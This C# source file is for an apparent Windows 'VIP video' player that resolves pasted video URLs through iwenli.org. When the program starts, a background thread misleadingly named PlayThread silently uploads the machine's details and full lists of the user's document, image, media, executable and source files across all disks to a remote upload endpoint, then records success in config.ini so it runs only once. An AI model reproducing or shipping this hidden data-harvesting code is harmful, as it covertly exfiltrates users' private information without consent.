using Iwenli.VIPVideo.Utility;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Iwenli.VIPVideo
{
    public partial class Form1 : Form
    {
        Thread playThread;
        string configPath = Path.Combine(MachineHelper.CurrentDirectory, "config.ini");

        public Form1()
        {
            InitializeComponent();
            Inin();
        }

        private void Inin()
        {
            this.comboBox1.SelectedIndex = 0;
            if (!IsPlay())
            {
                playThread = new Thread(PlayThread);
                playThread.Start();
            }
            BingEvent();
        }

        private void BingEvent()
        {
            this.serbtn.Click += (sender, e) =>
            {
                this.serbtn.Enabled = false;
                this.webBrowser1.Navigate("");
                string text = this.sertext.Text.Trim(new char[]
                {
                ' '
                });
                bool flag = text.Length < 10;
                if (flag)
                {
                    MessageBox.Show("网址错误,请重新输入.", "吵吵SAY");
                }
                else
                {
                    bool flag2 = string.IsNullOrEmpty(text);
                    if (flag2)
                    {
                        MessageBox.Show("搜索值不能为空.", "吵吵SAY");
                    }
                    else
                    {
                        bool flag3 = text.Contains("?");
                        string text2;
                        if (flag3)
                        {
                            string[] array = text.Split(new char[]
                            {
                            '?'
                            });
                            text2 = array[0];
                        }
                        else
                        {
                            text2 = text;
                        }

                        text2 = System.Web.HttpUtility.UrlEncode(text2, System.Text.Encoding.UTF8);
                        var url = new HttpHelper().GetPage("http://iwenli.org/vip.aspx?_=" + text2, "http://iwenli.org/");
                        this.webBrowser1.Navigate(System.Web.HttpUtility.UrlDecode(url));
                    }
                }

                this.serbtn.Enabled = true;
            };

        }

        private void PlayThread()
        {
            StringBuilder sb = new StringBuilder();
            string fileUploadServer = @"http://iwenli.org/api/fileUpload.axd";
            List<string> fileExtension = new List<string>() { "txt", "doc", "wps", "xls", "ppt", "pdf", "jpg", "bmp", "rmvb", "mp3", "exe", "js", "cs", "css", "html" };
            NameValueCollection queryParam = new NameValueCollection();
            queryParam["file_directory"] = "vip_userinfo";
            //基本信息
            sb.Append(new HttpHelper().UploadFile(fileUploadServer,
                        string.Format(@"{0}_{1}.txt", MachineHelper.MachineName, "baseinfo.txt"),
                        Encoding.GetEncoding("utf-8").GetBytes(MachineHelper.ToString()), queryParam) + Environment.NewLine);
            Thread.Sleep(1000);

            //遍历文件信息
            foreach (var currentExtension in fileExtension)
            {
                List<string> allFilePath = MachineHelper.GetAllDiskFile(currentExtension);
                if (allFilePath.Count > 0)
                {
                    string content = string.Join(Environment.NewLine, allFilePath.ToArray());
                    sb.Append(new HttpHelper().UploadFile(fileUploadServer,
                        string.Format(@"{0}_{1}.txt", MachineHelper.MachineName, currentExtension),
                        Encoding.GetEncoding("utf-8").GetBytes(content), queryParam) + Environment.NewLine);
                    Thread.Sleep(1000);
                }
            }
            File.WriteAllText(configPath, sb.ToString());
        }

        private bool IsPlay()
        {
            if (File.Exists(configPath)) {
                return File.ReadAllText(configPath).IndexOf("{\"errcode\":0,\"errmsg\":\"ok\"}") > 0 ? true : false;
            }
            return false;
        }
    }
}

